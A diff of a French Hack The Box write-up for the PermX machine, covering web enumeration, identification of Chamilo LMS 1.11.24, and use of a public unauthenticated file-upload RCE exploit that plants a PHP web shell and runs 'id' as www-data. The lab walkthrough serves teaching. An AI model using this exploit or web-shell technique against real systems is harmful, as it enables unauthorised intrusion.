@@ -526,27 +526,31 @@ Port 80 (http)
 
 ## Exploitation – Prise pied (Foothold)
 
+Les résultats de `mon-nmap` et `mon-subdomains` te conduisent naturellement vers l’application e-learning accessible sur `lms.permx.htb`. Avant toute tentative d’exploitation, tu lances donc un `mon-recoweb` ciblé sur ce virtual host, afin d’identifier les pages, répertoires et fonctionnalités susceptibles de mener à un premier point d’appui.
 
+#### Énumération web de lms.permx.htb avec mon-recoweb
+
+Avant toute tentative d’exploitation, tu commences par analyser l’application e-learning via un `mon-recoweb` sur `lms.permx.htb`, ce qui te permet d’obtenir une vue claire de sa structure interne et des fonctionnalités accessibles.
 
 ```bash
 ===== mon-recoweb — RÉSUMÉ DES RÉSULTATS =====
 Commande principale : /home/kali/.local/bin/mes-scripts/mon-recoweb
-Script              : mon-recoweb v2.2.0
+Script              : mon-recoweb v2.2.1
 
 Cible        : lms.permx.htb
 Périmètre    : /
-Date début   : 2026-02-07 16:39:32
+Date début   : 2026-02-08 17:37:32
 
 Commandes exécutées (exactes) :
 
 [dirb — découverte initiale]
-dirb http://lms.permx.htb/ /usr/share/wordlists/dirb/common.txt -r | tee scans_recoweb/dirb.log
+dirb http://lms.permx.htb/ /usr/share/wordlists/dirb/common.txt -r | tee scans_recoweb/lms.permx.htb/dirb.log
 
 [ffuf — énumération des répertoires]
-ffuf -u http://lms.permx.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 30 -timeout 10 -fc 404 -of json -o scans_recoweb/ffuf_dirs.json 2>&1 | tee scans_recoweb/ffuf_dirs.log
+ffuf -u http://lms.permx.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 30 -timeout 10 -fc 404 -of json -o scans_recoweb/lms.permx.htb/ffuf_dirs.json 2>&1 | tee scans_recoweb/lms.permx.htb/ffuf_dirs.log
 
 [ffuf — énumération des fichiers]
-ffuf -u http://lms.permx.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -t 30 -timeout 10 -fc 404 -of json -o scans_recoweb/ffuf_files.json 2>&1 | tee scans_recoweb/ffuf_files.log
+ffuf -u http://lms.permx.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -t 30 -timeout 10 -fc 404 -of json -o scans_recoweb/lms.permx.htb/ffuf_files.json 2>&1 | tee scans_recoweb/lms.permx.htb/ffuf_files.log
 
 Processus de génération des résultats :
 - Les sorties JSON produites par ffuf constituent la source de vérité.
@@ -668,8 +672,25 @@ http://lms.permx.htb/user.php (CODE:302|SIZE:0)
 http://lms.permx.htb/web.config (CODE:200|SIZE:5780)
 http://lms.permx.htb/whoisonline.php (CODE:200|SIZE:15471)
 http://lms.permx.htb/wp-forum.phps (CODE:403|SIZE:278)
-
 ```
+
+À la lecture des résultats de `mon-recoweb`, tu observes une application PHP bien structurée, exposant de nombreux répertoires fonctionnels (`/app`, `/main`, `/plugin`, `/vendor`, `/src`) et plusieurs fichiers accessibles directement depuis le web. Ces éléments indiquent un LMS complet, dans lequel l’exploitation va probablement nécessiter une analyse des mécanismes d’authentification et des fonctionnalités internes.
+
+#### Identification de la version de Chamilo
+
+Tu poursuis ensuite l’énumération de manière manuelle en explorant l’interface via le navigateur, avec un focus sur `/documentation` et plus particulièrement la page `changelog.html`.
+
+
+
+![chamilo](chamilo-index-login.png)
+
+
+
+![changelog](documentation-changelog.png)
+
+En consultant le changelog, tu confirmes que le LMS en place est ***Chamilo 1.11.24 (Beersel)***, ce qui te permet désormais de cibler des vulnérabilités connues associées à cette version.
+
+#### Recherche des vulnérabilités
 
 
 
@@ -686,7 +707,15 @@ Chamilo LMS 1.11.8 - 'firstname' Cr | php/webapps/45536.txt
 Chamilo LMS 1.11.8 - Cross-Site Scr | php/webapps/45535.txt
 ------------------------------------ ---------------------------------
 Shellcodes: No Results
-                                                                      
+```
+
+**La recherche de vulnérabilités avec `searchsploit` met en évidence un exploit de *Remote Code Execution* spécifiquement applicable à *Chamilo 1.11.24*, confirmant l’existence d’une piste d’exploitation directe.**
+
+#### Analyse de l’exploit Chamilo 1.11.24
+
+Après avoir identifié un exploit public correspondant à la version *Chamilo 1.11.24*, tu le télécharges avec `searchsploit -m` pour comprendre son fonctionnement avant de l’utiliser.
+
+```bash
 ┌──(kali㉿kali)-[/mnt/kvm-md0/HTB/permx]
 └─$ searchsploit -m php/webapps/52083.py  
   Exploit: Chamilo LMS 1.11.24 - Remote Code Execution (RCE)
@@ -697,6 +726,8 @@ Shellcodes: No Results
 File Type: Python script, ASCII text executable
 Copied to: /mnt/kvm-md0/HTB/permx/52083.py
 ```
+
+Tu commences par examiner le code de l’exploit que tu viens de télécharger, afin de comprendre précisément son fonctionnement et les mécanismes sur lesquels il s’appuie.
 
 
 
@@ -768,7 +799,35 @@ if __name__ == "__main__":
     execute_command(shell_url, args.cmd)
 ```
 
+Cet exploit cible **Chamilo LMS 1.11.24** et repose sur une **vulnérabilité d’upload de fichiers non restreint**, exploitable **sans authentification**. Le principe général est de profiter d’un mécanisme d’upload mal sécurisé pour déposer un fichier PHP arbitraire sur le serveur, puis de l’exécuter directement via le navigateur.
 
+Le script envoie un web shell PHP minimal vers l’endpoint `bigUpload.php`, utilisé par Chamilo pour la gestion des fichiers. En l’absence de contrôle suffisant sur le type ou le contenu du fichier envoyé, l’upload est accepté et le fichier est stocké dans le répertoire accessible depuis le web :
+
+```
+/main/inc/lib/javascript/bigupload/files/
+```
+
+Une fois le fichier en place, l’exploit appelle ce web shell avec un paramètre `cmd`. Celui-ci est directement passé à la fonction `system()` de PHP, ce qui permet d’exécuter des commandes arbitraires sur la machine cible avec les droits du service web.
+
+**Cette analyse confirme que l’exploit permet une exécution de commandes à distance sans authentification ; nous allons le démontrer dans un Proof of Concept simple en exécutant la commande `id`, avant d’exploiter cette primitive pour obtenir un reverse shell et poursuivre l’exploitation.**
+
+
+
+#### Proof of Concept — Validation de la RCE avec `id`
+
+Pour valider concrètement l’exécution de commandes à distance, tu commences par un Proof of Concept simple en exécutant la commande `id`, ce qui permet de confirmer le contexte d’exécution côté serveur avant d’aller plus loin.
+
+```bash
+python3 52083.py http://lms.permx.htb/ id
+
+[+] File uploaded successfully!
+[+] Access the shell at: http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/rce.php?cmd=
+[+] Command Output:
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+```
+
+Le résultat de la commande `id` montre que les commandes sont exécutées en tant que `www-data`, l’utilisateur du serveur web. Cette sortie valide la RCE et te donne un point d’appui suffisant pour **passer à l’obtention d’un reverse shell**.
 
 ---
 
